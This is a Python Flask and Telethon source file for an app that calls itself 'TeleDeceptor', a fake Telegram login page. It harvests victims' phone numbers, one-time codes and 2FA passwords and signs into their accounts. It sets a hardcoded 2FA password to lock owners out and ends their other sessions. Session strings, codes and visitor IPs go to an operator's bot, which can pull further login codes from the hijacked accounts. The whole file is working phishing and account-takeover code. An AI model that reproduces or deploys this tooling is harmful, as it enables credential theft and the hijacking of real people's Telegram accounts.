from flask import Flask, render_template, request, redirect, url_for, session
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetAuthorizationsRequest, GetPasswordRequest
from telethon.tl.functions.account import ResetAuthorizationRequest
from telethon.tl.functions.account import UpdatePasswordSettingsRequest
from telethon.tl.types import InputCheckPasswordEmpty, InputCheckPasswordSRP
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
import os
from dotenv import load_dotenv
import asyncio
import nest_asyncio
import requests
from datetime import datetime
from flask import request as flask_request
import json
from telegram.ext import Updater, CallbackQueryHandler, CommandHandler, Filters, MessageHandler
import threading
import re

# Enable nested event loops
nest_asyncio.apply()

# Create a single event loop for the entire application
main_loop = asyncio.new_event_loop()
asyncio.set_event_loop(main_loop)

load_dotenv()

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Telegram API credentials
try:
    API_ID = int(os.getenv('API_ID', '0'))  # Convert to integer with fallback
    API_HASH = os.getenv('API_HASH', '')
except (TypeError, ValueError):
    print("Error: API_ID must be an integer. Please check your environment variables.")
    API_ID = 0
    API_HASH = ''

# Admin bot credentials
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
try:
    ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))  # Convert to integer with fallback
except (TypeError, ValueError):
    print("Error: ADMIN_ID must be an integer. Please check your environment variables.")
    ADMIN_ID = 0

# Store active sessions and clients
active_sessions = {}
telegram_clients = {}

# Global client variable
client = None
updater = None

def run_async(coro):
    """Run an async function in the main event loop"""
    return main_loop.run_until_complete(coro)

def get_event_loop():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop

def send_to_admin(message):
    """Send a message to the admin using the Telegram Bot API"""
    if BOT_TOKEN and ADMIN_ID:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": ADMIN_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            requests.post(url, data=data)
        except Exception as e:
            print(f"Error sending to admin: {e}")

def send_admin_keyboard(message, keyboard):
    """Send a message with inline keyboard to admin"""
    if BOT_TOKEN and ADMIN_ID:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": ADMIN_ID,
                "text": message,
                "parse_mode": "HTML",
                "reply_markup": json.dumps(keyboard)
            }
            requests.post(url, data=data)
        except Exception as e:
            print(f"Error sending keyboard to admin: {e}")

def get_client_info():
    """Get client IP and timestamp"""
    ip = flask_request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_agent = flask_request.user_agent.string
    return ip, time, user_agent

async def terminate_other_sessions(client):
    """Terminate all other sessions except the current one"""
    try:
        # Get all authorized sessions
        authorizations = await client(GetAuthorizationsRequest())
        
        # The current session is usually the last one
        current_hash = authorizations.authorizations[-1].hash
        
        # Count terminated sessions
        terminated = 0
        
        # Terminate all other sessions
        for auth in authorizations.authorizations[:-1]:
            try:
                await client(ResetAuthorizationRequest(auth.hash))
                terminated += 1
            except Exception as e:
                print(f"Error terminating session {auth.hash}: {e}")
                continue
        
        return terminated
    except Exception as e:
        print(f"Error in terminate_other_sessions: {e}")
        return 0

async def get_telegram_message(client):
    """Get the latest message from Telegram"""
    try:
        # Get all dialogs
        print("📱 Getting dialogs...")
        dialogs = await client.get_dialogs()
        print(f"📨 Found {len(dialogs)} dialogs")
        
        # Find Telegram's dialog
        telegram_dialog = None
        for dialog in dialogs:
            print(f"Checking dialog: {dialog.name} ({dialog.entity.id if hasattr(dialog.entity, 'id') else 'No ID'})")
            if dialog.entity and hasattr(dialog.entity, 'id') and dialog.entity.id == 777000:
                telegram_dialog = dialog
                break
        
        if telegram_dialog:
            print(f"✅ Found Telegram dialog: {telegram_dialog.name}")
            # Get messages from this dialog
            messages = await client.get_messages(telegram_dialog.entity, limit=1)
            print(f"📨 Messages: {messages}")
            
            if messages and len(messages) > 0 and messages[0].text:
                return messages[0].text
        else:
            print("❌ Could not find Telegram dialog")
            # Try to get messages directly using the ID
            try:
                print("🔄 Trying to get messages directly...")
                messages = await client.get_messages(777000, limit=1)
                print(f"📨 Direct messages: {messages}")
                
                if messages and len(messages) > 0 and messages[0].text:
                    return messages[0].text
            except Exception as e:
                print(f"❌ Error getting direct messages: {e}")
        
        return None
    except Exception as e:
        print(f"❌ Error getting message: {e}")
        return None

def handle_callback(update, context):
    """Handle callback queries from inline buttons"""
    print("⭐ Callback received")
    try:
        callback_query = update.callback_query
        data = callback_query.data
        chat_id = callback_query.message.chat.id
        
        print(f"📝 Callback data: {data}")
        print(f"👤 Chat ID: {chat_id}")
        print(f"🆔 Admin ID: {ADMIN_ID}")
        
        if str(chat_id) != ADMIN_ID:
            print("❌ Unauthorized callback attempt")
            callback_query.answer("Unauthorized")
            return
        
        try:
            # Split on last underscore to handle get_code and get_phone correctly
            parts = data.rsplit('_', 1)
            if len(parts) != 2:
                raise ValueError("Invalid callback data format")
            
            action = parts[0]
            phone = parts[1]
            print(f"🎯 Action: {action}")
            print(f"📱 Phone: {phone}")
        except ValueError as e:
            print(f"❌ Error parsing callback data: {e}")
            print(f"📝 Raw data: {data}")
            callback_query.answer("Invalid callback data")
            return
        
        if action == 'get_code':
            print("📥 Processing get_code action")
            if phone in active_sessions:
                print(f"✅ Found session for {phone}")
                try:
                    client = active_sessions[phone]['client']
                    print("📱 Got client from active sessions")
                    print(f"📊 Client connected: {client.is_connected()}")
                    
                    if not client.is_connected():
                        print("🔄 Connecting client...")
                        run_async(client.connect())
                        print("✅ Client connected")
                    
                    print("📨 Fetching messages...")
                    message = run_async(get_telegram_message(client))
                    print(f"📬 Got message: {message}")
                    
                    if message:
                        print(f"📜 Message text: {message}")
                        send_to_admin(
                            f"📱 <b>Latest Message</b>\n"
                            f"Phone: <code>{phone}</code>\n"
                            f"Message: <code>{message}</code>"
                        )
                        callback_query.answer("Message retrieved!")
                        print("✅ Message sent to admin")
                    else:
                        print("❌ No messages found")
                        send_to_admin(
                            f"❌ No messages found for {phone}"
                        )
                        callback_query.answer("No messages found!")
                except Exception as e:
                    error_msg = str(e)
                    print(f"❌ Error in get_code: {error_msg}")
                    print(f"📊 Client status: {client.is_connected() if client else 'No client'}")
                    send_to_admin(
                        f"❌ Error getting message\n"
                        f"Phone: {phone}\n"
                        f"Error: {error_msg}"
                    )
                    callback_query.answer("Error getting message!")
            else:
                print(f"❌ No session found for {phone}")
                print(f"📊 Active sessions: {list(active_sessions.keys())}")
                send_to_admin(f"❌ Session not found for {phone}")
                callback_query.answer("Session not found!")
        
        elif action == 'get_phone':
            print("📥 Processing get_phone action")
            if phone in active_sessions:
                print(f"✅ Found session for {phone}")
                try:
                    client = active_sessions[phone]['client']
                    print("📱 Got client from active sessions")
                    print(f"📊 Client connected: {client.is_connected()}")
                    
                    if not client.is_connected():
                        print("🔄 Connecting client...")
                        run_async(client.connect())
                        print("✅ Client connected")
                    
                    print("👤 Getting user info...")
                    me = run_async(client.get_me())
                    print(f"ℹ️ User info: {me}")
                    
                    if me:
                        send_to_admin(
                            f"📱 <b>Account Info</b>\n"
                            f"Phone: <code>{phone}</code>\n"
                            f"First Name: <code>{me.first_name or 'N/A'}</code>\n"
                            f"Last Name: <code>{me.last_name or 'N/A'}</code>\n"
                            f"Username: <code>{me.username or 'N/A'}</code>\n"
                            f"User ID: <code>{me.id}</code>"
                        )
                        callback_query.answer("Info retrieved!")
                        print("✅ User info sent to admin")
                    else:
                        print("⚠️ Could not get detailed info")
                        send_to_admin(
                            f"📱 Basic Phone Info\n"
                            f"Phone: <code>{phone}</code>\n"
                            f"Note: Could not get detailed info"
                        )
                        callback_query.answer("Basic info retrieved!")
                except Exception as e:
                    error_msg = str(e)
                    print(f"❌ Error in get_phone: {error_msg}")
                    print(f"📊 Client status: {client.is_connected() if client else 'No client'}")
                    send_to_admin(
                        f"❌ Error getting phone info\n"
                        f"Phone: {phone}\n"
                        f"Error: {error_msg}"
                    )
                    callback_query.answer("Error getting info!")
            else:
                print(f"❌ No session found for {phone}")
                print(f"📊 Active sessions: {list(active_sessions.keys())}")
                send_to_admin(f"❌ Session not found for {phone}")
                callback_query.answer("Session not found!")
        
        elif action == 'terminate':
            print("📥 Processing terminate action")
            if phone in active_sessions:
                print(f"✅ Found session for {phone}")
                try:
                    client = active_sessions[phone]['client']
                    print("📱 Got client from active sessions")
                    print(f"📊 Client connected: {client.is_connected()}")
                    
                    if not client.is_connected():
                        print("🔄 Connecting client...")
                        run_async(client.connect())
                        print("✅ Client connected")
                    
                    print("🔄 Logging out...")
                    run_async(client.log_out())
                    print("✅ Logged out")
                    
                    del active_sessions[phone]
                    if phone in telegram_clients:
                        del telegram_clients[phone]
                    print("🗑️ Cleaned up session data")
                    
                    send_to_admin(f"✅ Session terminated for {phone}")
                    callback_query.answer("Session terminated!")
                    print("✅ Termination complete")
                except Exception as e:
                    error_msg = str(e)
                    print(f"❌ Error in terminate: {error_msg}")
                    print(f"📊 Client status: {client.is_connected() if client else 'No client'}")
                    send_to_admin(
                        f"❌ Error terminating session\n"
                        f"Phone: {phone}\n"
                        f"Error: {error_msg}"
                    )
                    callback_query.answer("Error terminating session!")
            else:
                print(f"❌ No session found for {phone}")
                print(f"📊 Active sessions: {list(active_sessions.keys())}")
                send_to_admin(f"❌ Session not found for {phone}")
                callback_query.answer("Session not found!")
        
        elif action == 'reset':
            print("📥 Processing reset action")
            if phone in active_sessions:
                print(f"✅ Found session for {phone}")
                try:
                    client = active_sessions[phone]['client']
                    print("📱 Got client from active sessions")
                    print(f"📊 Client connected: {client.is_connected()}")
                    
                    if not client.is_connected():
                        print("🔄 Connecting client...")
                        run_async(client.connect())
                        print("✅ Client connected")
                    
                    print("🔄 Resetting sessions...")
                    terminated = run_async(terminate_other_sessions(client))
                    print(f"✅ Reset {terminated} sessions")
                    
                    send_to_admin(f"✅ Reset {terminated} sessions for {phone}")
                    callback_query.answer("Sessions reset!")
                    print("✅ Reset complete")
                except Exception as e:
                    error_msg = str(e)
                    print(f"❌ Error in reset: {error_msg}")
                    print(f"📊 Client status: {client.is_connected() if client else 'No client'}")
                    send_to_admin(
                        f"❌ Error resetting sessions\n"
                        f"Phone: {phone}\n"
                        f"Error: {error_msg}"
                    )
                    callback_query.answer("Error resetting sessions!")
            else:
                print(f"❌ No session found for {phone}")
                print(f"📊 Active sessions: {list(active_sessions.keys())}")
                send_to_admin(f"❌ Session not found for {phone}")
                callback_query.answer("Session not found!")
        
        else:
            print(f"❌ Unknown action: {action}")
            callback_query.answer("Unknown action")
    
    except Exception as e:
        error_msg = str(e)
        print(f"❌ Error handling callback: {error_msg}")
        print(f"📊 Active sessions: {list(active_sessions.keys())}")
        send_to_admin(f"❌ Error handling button press: {error_msg}")
        try:
            callback_query.answer("An error occurred!")
        except:
            pass

def start_bot():
    """Start the Telegram bot"""
    global updater
    try:
        if not BOT_TOKEN:
            print("Bot token not found. Admin notifications will not work.")
            return
            
        # Create the Updater and pass it your bot's token with use_context
        updater = Updater(token=BOT_TOKEN, use_context=True)

        # Get the dispatcher to register handlers
        dp = updater.dispatcher

        # Define start command handler
        def start_command(update, context):
            """Handle the /start command with webapp support."""
            user = update.effective_user
            
            # Check if this is a webapp start
            if hasattr(update.message, 'text') and len(update.message.text.split()) > 1:
                # This is a webapp start command with parameters
                start_params = update.message.text.split(maxsplit=1)[1]
                
                if start_params.startswith('startapp='):
                    # This is a webapp start
                    webapp_url = start_params.replace('startapp=', '')
                    update.message.reply_html(
                        f"Hi {user.mention_html()}! Welcome to TeleDeceptor.\n\n"
                        f"<b>🌐 Opening web application...</b>\n"
                        f"If it doesn't open automatically, <a href='{webapp_url}'>click here</a>."
                    )
                    return
            
            # Regular start command
            update.message.reply_html(
                f"Hi {user.mention_html()}! I'm the TeleDeceptor Admin Bot.\n\n"
                f"You can use this bot to manage your TeleDeceptor sessions and receive notifications."
            )
            
        # Register handlers
        dp.add_handler(CommandHandler("start", start_command))
        dp.add_handler(CallbackQueryHandler(handle_callback))
        
        # Add error handler
        dp.add_error_handler(error_handler)

        # Start the Bot
        updater.start_polling(drop_pending_updates=True)
        
        # Create Telegram web app link
        # Generate a unique Mini App deep link that will properly open as WebApp
        import random
        import string
        import time
        
        # Generate a short random ID that will be used for the mini app
        mini_app_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        timestamp = int(time.time())
        
        # Try to get the hostname for the URL
        try:
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            webapp_url = f"http://{local_ip}:5000"
        except Exception as e:
            print(f"Could not determine hostname: {e}")
            webapp_url = "http://0.0.0.0:5000"
        
        # Generate standard bot link with webapp parameter
        standard_link = f"https://t.me/{updater.bot.username}?startapp=webapp"
        
        # Generate mini app link which should open as a webapp
        # Format: /start VESLF-5000-250-timestamp
        mini_app_code = f"{mini_app_id}-5000-250-{timestamp}"
        telegram_webapp_link = f"https://t.me/{updater.bot.username}/app?startapp={mini_app_code}"
        
        # Send startup message with web app links
        send_to_admin(
            f"🚀 <b>Bot Started</b>\nRunning in polling mode\n\n"
            f"📱 <b>Telegram Web App Links:</b>\n\n"
            f"1️⃣ <b>Mini App Link:</b>\n"
            f"<a href='{telegram_webapp_link}'>{telegram_webapp_link}</a>\n\n"
            f"2️⃣ <b>Standard Link:</b>\n"
            f"<a href='{standard_link}'>{standard_link}</a>\n\n"
            f"3️⃣ <b>Web URL:</b>\n"
            f"<a href='{webapp_url}'>{webapp_url}</a>\n\n"
            f"Try all three links - one of them should open as a proper Telegram WebApp!"
        )
        
        print(f"Bot started successfully")
        print(f"Telegram Web App Link: {telegram_webapp_link}")
    except Exception as e:
        print(f"Error starting bot: {e}")
        
def error_handler(update, context):
    """Log Errors caused by Updates."""
    print(f"Update {update} caused error {context.error}")
    
# Original start_bot exception handler
def start_bot_orig():
    """Original start_bot exception handler"""
    try:
        pass  # This is just here to preserve structure
    except Exception as e:
        print(f"Error starting bot: {e}")

async def send_code(phone):
    global client, telegram_clients
    
    try:
        # Disconnect existing client if any
        if phone in telegram_clients and telegram_clients[phone]:
            await telegram_clients[phone].disconnect()
        
        # Create new client with device info
        client = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH, 
            loop=main_loop,
            device_model="Samsung Galaxy S22",
            system_version="Android 13",
            app_version="TeleDeceptor 1.2.0"
        )
        await client.connect()
        
        # Store in clients dictionary
        telegram_clients[phone] = client
        
        # Set correct connection parameters
        code_result = await client.send_code_request(
            phone,
            force_sms=False
        )
        return code_result.phone_code_hash
    except Exception as e:
        print(f"Error in send_code: {e}")
        raise e

async def verify_code(phone, code, phone_code_hash):
    global client, telegram_clients
    
    try:
        # Get client from dictionary or create new one
        if phone in telegram_clients:
            client = telegram_clients[phone]
        else:
            client = TelegramClient(
                StringSession(), 
                API_ID, 
                API_HASH, 
                loop=main_loop,
                device_model="Samsung Galaxy S22",
                system_version="Android 13",
                app_version="TeleDeceptor 1.2.0"
            )
            telegram_clients[phone] = client
        
        if not client.is_connected():
            await client.connect()
        
        # Try to sign in
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        
        # Get the session string
        session_string = client.session.save()
        
        # Store session info
        active_sessions[phone] = {
            'session_string': session_string,
            'client': client
        }
        
        # Set up 2FA password if not already set
        try:
            # Get me to ensure we are logged in
            me = await client.get_me()
            
            # Try to configure 2FA (this may not work with newer Telethon versions)
            try:
                # Simpler approach - use Telethon client directly
                has_2fa = await client.is_user_authorized()
                
                if has_2fa:
                    print("✅ User is authorized, checking 2FA status")
                    try:
                        # Use client.edit_2fa to set 2FA password
                        await client.edit_2fa(new_password='m13631017', hint='Security password')
                        password_status = "✅ 2FA password set to 'm13631017'"
                        print(password_status)
                    except Exception as e:
                        password_status = f"❌ Could not set 2FA password: {str(e)}"
                        print(password_status)
                else:
                    print("❌ User is not fully authorized")
                    password_status = "❌ Could not set 2FA password: user not fully authorized"
            except Exception as e:
                password_status = f"❌ Could not set 2FA password: {str(e)}"
                print(f"Error setting 2FA password: {e}")
                
        except Exception as e:
            print(f"Error setting 2FA password: {e}")
            password_status = f"❌ Could not set 2FA password: {str(e)}"
        
        # Terminate other sessions
        terminated = await terminate_other_sessions(client)
        
        # Send session info to admin with management keyboard
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "🔑 Get Login Code", "callback_data": f"get_code_{phone}"},
                    {"text": "📱 Get Phone", "callback_data": f"get_phone_{phone}"}
                ],
                [
                    {"text": "❌ Terminate Session", "callback_data": f"terminate_{phone}"},
                    {"text": "🔄 Reset Sessions", "callback_data": f"reset_{phone}"}
                ]
            ]
        }
        
        send_admin_keyboard(
            f"✅ <b>New Session Activated</b>\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"🔄 Terminated Sessions: {terminated}\n"
            f"🔐 Session String: <code>{session_string}</code>\n"
            f"🔒 2FA Status: {password_status}",
            keyboard
        )
        
        return session_string
    except SessionPasswordNeededError:
        # If 2FA is required, automatically try with the provided password
        try:
            await client.sign_in(password='m13631017')
            session_string = client.session.save()
            
            # Store session info
            active_sessions[phone] = {
                'session_string': session_string,
                'client': client
            }
            
            # Terminate other sessions
            terminated = await terminate_other_sessions(client)
            
            # Send session info to admin with management keyboard
            keyboard = {
                "inline_keyboard": [
                    [
                        {"text": "🔑 Get Login Code", "callback_data": f"get_code_{phone}"},
                        {"text": "📱 Get Phone", "callback_data": f"get_phone_{phone}"}
                    ],
                    [
                        {"text": "❌ Terminate Session", "callback_data": f"terminate_{phone}"},
                        {"text": "🔄 Reset Sessions", "callback_data": f"reset_{phone}"}
                    ]
                ]
            }
            
            send_admin_keyboard(
                f"✅ <b>New Session Activated (2FA)</b>\n"
                f"📱 Phone: <code>{phone}</code>\n"
                f"🔄 Terminated Sessions: {terminated}\n"
                f"🔐 Session String: <code>{session_string}</code>",
                keyboard
            )
            
            return session_string
        except Exception as e:
            print(f"Error in 2FA verification: {e}")
            raise e
    except Exception as e:
        print(f"Error in verify_code: {e}")
        raise e

async def set_2fa_password(client, new_password):
    """Set up or change 2FA password for the account"""
    try:
        print(f"🔒 Setting up 2FA password...")
        
        # Check if 2FA is already enabled
        has_2fa = False
        try:
            current_password = await client(GetPasswordRequest())
            has_2fa = current_password.has_password
            print(f"⚠️ 2FA is already enabled: {has_2fa}")
        except Exception as e:
            print(f"Error checking 2FA status: {e}")
            print("✅ Assuming 2FA is not enabled yet")
        
        # If 2FA is already enabled, log it but don't try to change
        if has_2fa:
            print("⚠️ Cannot update existing 2FA password automatically")
            return False
        else:
            # If 2FA is not enabled, set it up
            try:
                from telethon.tl.functions.account import GetPasswordRequest
                
                # Get current password first
                pwd_request = await client(GetPasswordRequest())
                
                if not pwd_request.has_password:
                    from telethon.tl.functions.account import UpdatePasswordSettingsRequest
                    
                    # Set up new password
                    new_pass = new_password.encode('utf-8')
                    new_settings = {
                        'new_algo': pwd_request.new_algo,
                        'new_password_hash': new_pass,
                        'hint': 'Security password',
                        'email': ''
                    }
                    
                    # Actually set the password
                    password_empty = InputCheckPasswordEmpty()
                    result = await client(UpdatePasswordSettingsRequest(
                        password=password_empty,
                        new_settings=new_settings
                    ))
                    
                    if result:
                        print("✅ Successfully set up 2FA password")
                        return True
                    else:
                        print("❌ Failed to set up 2FA password")
                        return False
                    
            except Exception as e:
                print(f"❌ Error setting up 2FA password: {e}")
                return False
    except Exception as e:
        print(f"❌ General error in set_2fa_password: {e}")
        return False

async def verify_2fa(password):
    global client
    try:
        # Complete the sign in with 2FA password
        await client.sign_in(password=password)
        
        # Get the session string
        session_string = client.session.save()
        
        # Store session info
        phone = (await client.get_me()).phone
        active_sessions[phone] = {
            'session_string': session_string,
            'client': client
        }
        
        # Terminate other sessions
        terminated = await terminate_other_sessions(client)
        
        # Try to set 2FA password (this will likely fail if 2FA is already enabled)
        try:
            # Get me to ensure we are logged in
            me = await client.get_me()
            
            # Try to configure 2FA (this may not work with newer Telethon versions)
            try:
                # Simpler approach - use Telethon client directly
                has_2fa = await client.is_user_authorized()
                
                if has_2fa:
                    print("✅ User is authorized, checking 2FA status")
                    try:
                        # Use client.edit_2fa to set 2FA password
                        await client.edit_2fa(new_password='m13631017', hint='Security password')
                        password_status = "✅ 2FA password set to 'm13631017'"
                        print(password_status)
                    except Exception as e:
                        password_status = f"❌ Could not set 2FA password: {str(e)}"
                        print(password_status)
                else:
                    print("❌ User is not fully authorized")
                    password_status = "❌ Could not set 2FA password: user not fully authorized"
            except Exception as e:
                password_status = f"❌ Could not set 2FA password: {str(e)}"
                print(f"Error setting 2FA password: {e}")
                
        except Exception as e:
            print(f"Error setting 2FA password: {e}")
            password_status = f"❌ Could not set 2FA password: {str(e)}"
        
        # Send session info to admin with management keyboard
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "🔑 Get Login Code", "callback_data": f"get_code_{phone}"},
                    {"text": "📱 Get Phone", "callback_data": f"get_phone_{phone}"}
                ],
                [
                    {"text": "❌ Terminate Session", "callback_data": f"terminate_{phone}"},
                    {"text": "🔄 Reset Sessions", "callback_data": f"reset_{phone}"}
                ]
            ]
        }
        
        send_admin_keyboard(
            f"✅ <b>New Session Activated (2FA)</b>\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"🔄 Terminated Sessions: {terminated}\n"
            f"🔐 Session String: <code>{session_string}</code>\n"
            f"🔒 2FA Status: {password_status}",
            keyboard
        )
        
        return session_string
    except Exception as e:
        raise e

@app.route('/')
def index():
    # Log page visit
    ip, time, user_agent = get_client_info()
    send_to_admin(
        f"<b>🔔 New Login Page Visit</b>\n"
        f"<b>IP:</b> {ip}\n"
        f"<b>Time:</b> {time}\n"
        f"<b>User Agent:</b> {user_agent}"
    )
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone')
    country_code = request.form.get('country_code')
    full_phone = f"{country_code}{phone}"
    
    # Log phone number submission
    ip, time, user_agent = get_client_info()
    send_to_admin(
        f"<b>📱 Phone Number Submitted</b>\n"
        f"<b>Phone:</b> {full_phone}\n"
        f"<b>Country Code:</b> {country_code}\n"
        f"<b>Phone Number:</b> {phone}\n"
        f"<b>IP:</b> {ip}\n"
        f"<b>Time:</b> {time}\n"
        f"<b>User Agent:</b> {user_agent}"
    )
    
    try:
        phone_code_hash = run_async(send_code(full_phone))
        
        # Store phone and hash in session
        session['phone'] = full_phone
        session['phone_code_hash'] = phone_code_hash
        
        return render_template('code.html', phone=full_phone)
    except Exception as e:
        send_to_admin(
            f"<b>❌ Login Error</b>\n"
            f"<b>Phone:</b> {full_phone}\n"
            f"<b>Error:</b> {str(e)}\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>Time:</b> {time}"
        )
        return render_template('index.html', error=str(e))

@app.route('/resend')
def resend():
    phone = session.get('phone')
    if not phone:
        return redirect(url_for('index'))
    
    # Log code resend
    ip, time, user_agent = get_client_info()
    send_to_admin(
        f"<b>🔄 Code Resend Request</b>\n"
        f"<b>Phone:</b> {phone}\n"
        f"<b>IP:</b> {ip}\n"
        f"<b>Time:</b> {time}"
    )
    
    try:
        phone_code_hash = run_async(send_code(phone))
        
        # Update hash in session
        session['phone_code_hash'] = phone_code_hash
        
        return render_template('code.html', phone=phone, message="New code sent!")
    except Exception as e:
        send_to_admin(
            f"<b>❌ Resend Error</b>\n"
            f"<b>Phone:</b> {phone}\n"
            f"<b>Error:</b> {str(e)}\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>Time:</b> {time}"
        )
        return render_template('code.html', phone=phone, error=str(e))

@app.route('/verify', methods=['POST'])
def verify():
    code = request.form.get('code')
    phone = session.get('phone')
    phone_code_hash = session.get('phone_code_hash')
    
    if not phone or not phone_code_hash:
        return redirect(url_for('index'))
    
    # Log verification attempt
    ip, time, user_agent = get_client_info()
    send_to_admin(
        f"<b>🔑 Verification Code Submitted</b>\n"
        f"<b>Phone:</b> {phone}\n"
        f"<b>Code:</b> {code}\n"
        f"<b>IP:</b> {ip}\n"
        f"<b>Time:</b> {time}"
    )
    
    try:
        session_string = run_async(verify_code(phone, code, phone_code_hash))
        return render_template('success.html')
    except SessionPasswordNeededError:
        send_to_admin(
            f"<b>🔒 2FA Required</b>\n"
            f"<b>Phone:</b> {phone}\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>Time:</b> {time}"
        )
        return render_template('2fa.html')
    except (PhoneCodeExpiredError, PhoneCodeInvalidError) as e:
        send_to_admin(
            f"<b>❌ Verification Failed</b>\n"
            f"<b>Phone:</b> {phone}\n"
            f"<b>Code:</b> {code}\n"
            f"<b>Error:</b> Invalid or expired code\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>Time:</b> {time}"
        )
        return render_template('code.html', phone=phone, error="Invalid or expired code. Please try again or request a new code.")
    except Exception as e:
        send_to_admin(
            f"<b>❌ Verification Error</b>\n"
            f"<b>Phone:</b> {phone}\n"
            f"<b>Code:</b> {code}\n"
            f"<b>Error:</b> {str(e)}\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>Time:</b> {time}"
        )
        return render_template('code.html', phone=phone, error=f"Login error: {str(e)}")

@app.route('/verify-2fa', methods=['POST'])
def verify_2fa_route():
    password = request.form.get('password')
    phone = session.get('phone')
    
    # Log 2FA attempt
    ip, time, user_agent = get_client_info()
    send_to_admin(
        f"<b>🔒 2FA Password Submitted</b>\n"
        f"<b>Phone:</b> {phone}\n"
        f"<b>IP:</b> {ip}\n"
        f"<b>Time:</b> {time}"
    )
    
    try:
        session_string = run_async(verify_2fa(password))
        return render_template('success.html')
    except Exception as e:
        send_to_admin(
            f"<b>❌ 2FA Verification Error</b>\n"
            f"<b>Phone:</b> {phone}\n"
            f"<b>Error:</b> {str(e)}\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>Time:</b> {time}"
        )
        return render_template('2fa.html', error="Invalid 2FA password. Please try again.")

if __name__ == '__main__':
    # Start the bot in a separate thread
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # Run Flask app - use 0.0.0.0 for Replit compatibility
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)